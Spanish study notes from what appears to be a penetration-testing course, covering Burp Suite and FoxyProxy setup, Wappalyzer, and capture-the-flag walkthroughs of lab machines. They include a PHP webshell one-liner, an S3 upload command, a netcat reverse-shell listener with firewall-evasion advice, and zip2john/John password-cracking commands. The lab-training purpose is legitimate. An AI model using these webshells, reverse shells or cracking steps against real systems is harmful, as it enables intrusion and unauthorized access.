**Burp Suite y Foxy Proxy — El proxy interceptor**

Burp Suite es la herramienta de referencia para auditorías web. La versión Community viene preinstalada en Kali. Para que funcione correctamente con el navegador, hace falta configurar dos cosas.

Primero, la extensión **FoxyProxy** en Firefox, que permite activar y desactivar el proxy con un clic sin tocar la configuración del sistema:

- Instalar FoxyProxy desde las extensiones de Firefox
    
- Ir a opciones → proxies → añadir nuevo
    
- Título: burp (o el que se quiera)
    
- Host: 127.0.0.1
    
- Puerto: 8080
    
- Guardar
    

Segundo, instalar el certificado de Burp Suite para que el navegador confíe en él y no bloquee el tráfico HTTPS. Con FoxyProxy activado apuntando a Burp, navegar a:

```
http://burpsuite
```

Descargar el certificado, ir a Settings del navegador → Certificates → importarlo marcando las dos casillas de confianza.

Con esto configurado, al activar el proxy en FoxyProxy y tener Burp con Intercept activado, cualquier petición que salga del navegador queda capturada antes de enviarse. Se puede modificar el contenido y reenviarla, lo que permite bypassear validaciones del frontend.

- **La idea clave:** las validaciones del frontend (que un campo solo acepte números, que solo se puedan subir JPGs) son puramente decorativas desde el punto de vista de seguridad. El servidor tiene que validar también en el backend, porque cualquiera puede interceptar la petición con Burp y modificarla antes de que llegue

**Wappalyzer — Identificar tecnologías sin hacer ruido**

Wappalyzer es una extensión de navegador (disponible en Firefox y Chrome) que analiza los ficheros y cabeceras de una página web para identificar las tecnologías que usa: framework, servidor web, CMS, CDN, librerías JavaScript. No hace peticiones adicionales ni escaneos activos, solo analiza lo que el navegador ya ha recibido.

Es útil para identificar rápidamente si una web usa WordPress, Drupal, PHP, si está detrás de Cloudflare, si usa AWS, etc., lo que orienta qué vectores de ataque probar.

**Máquina Three — AWS S3: webshell y reverse shell**

Continuando desde la sesión anterior, una vez identificado el bucket S3 mal configurado, el flujo de explotación es subir código PHP que el servidor ejecute.

**Webshell** — permite ejecutar comandos directamente desde el navegador a través de un parámetro:

```
<?php system($_GET['cmd']); ?>
```

Se sube al bucket con AWS CLI y se accede desde el navegador añadiendo el parámetro cmd:

```
aws s3 cp webshell.php s3://thetoppers.htb --endpoint-url http://s3.thetoppers.htb
# Acceder: http://thetoppers.htb/webshell.php?cmd=id
```

**Reverse shell** — en vez de ejecutar comandos uno a uno desde el navegador, la reverse shell establece una conexión persistente desde el servidor hacia la máquina atacante. El servidor se conecta al atacante (no al revés), lo que facilita bypassear firewalls que bloquean conexiones entrantes.

El flujo es: poner Netcat a la escucha en la máquina atacante, subir el PHP de reverse shell con la IP y puerto del atacante codificados, y al cargar el PHP en el navegador se establece la conexión:

```
# Escuchar en la máquina atacante
nc -lvnp 443

# PHP reverse shell apunta a nuestra IP y puerto
# Al cargarlo en el navegador, llega la conexión
```

Se recomienda usar puertos comunes (80, 443, 22) para la escucha, ya que en entornos reales muchos firewalls solo permiten tráfico saliente hacia esos puertos.

El usuario obtenido al entrar es www-data o equivalente, la cuenta de servicio del servidor web. Para esta máquina, la flag está en /var/www/html o en el propio bucket.

- **La metáfora útil:** la diferencia entre webshell y reverse shell es como entrar a una habitación y gritar órdenes desde la puerta (webshell) versus que alguien de dentro te abra un túnel privado para que entres y te muevas libremente (reverse shell)

**Máquina Appointment (Tier 2) — FTP con credenciales y ZIP protegido**

Se introduce brevemente la primera máquina del Tier 2. El escaneo Nmap revela FTP en el puerto 21. El servidor tiene configurado un usuario concreto (no anónimo). Con las credenciales correctas se accede y se descarga un [backup.zip](http://backup.zip/) que está protegido con contraseña.

Para romper la contraseña de un ZIP se usa la herramienta zip2john, que extrae el hash del archivo, y después John the Ripper para crackearlo:

```
zip2john backup.zip > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
